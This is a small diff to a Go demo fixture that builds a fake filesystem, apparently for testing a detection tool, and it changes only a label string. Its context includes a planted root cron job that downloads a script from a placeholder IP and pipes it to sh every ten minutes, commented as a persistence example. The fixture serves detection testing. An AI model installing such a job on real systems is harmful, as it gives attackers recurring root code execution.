@@ -27,7 +27,7 @@ func Demo(now time.Time) *Tree {
 				"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n" +
 				"postgres:x:113:120:PostgreSQL:/var/lib/postgresql:/bin/bash\n" +
 				"deploy:x:1000:1000:Deploy:/home/deploy:/bin/bash\n",
-			"etc/os-release": "PRETTY_NAME=\"Ubuntu 24.04 LTS (демо)\"\nID=ubuntu\n",
+			"etc/os-release": "PRETTY_NAME=\"Ubuntu 24.04 LTS (demo)\"\nID=ubuntu\n",
 			// Закрепление: задание cron, скачивающее и запускающее скрипт.
 			"etc/cron.d/sysupdate": "*/10 * * * * root curl -fsSL http://203.0.113.50/u.sh | sh\n",
 			// Штатное задание — не должно давать признаков.
